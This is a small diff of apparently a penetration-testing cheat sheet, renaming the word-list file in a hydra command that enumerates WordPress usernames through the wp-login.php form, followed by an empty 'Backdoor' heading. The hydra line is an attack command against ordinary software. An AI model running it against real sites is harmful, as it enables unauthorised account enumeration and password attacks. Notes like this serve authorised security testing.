@@ -4,7 +4,7 @@ TODO: Fill in the info
 
 ## Username Enumeration
 
-`$ hydra -V -L users.txt -p password <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'`
+`$ hydra -V -L users.lst -p password <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'`
 
 ## Backdoor
 
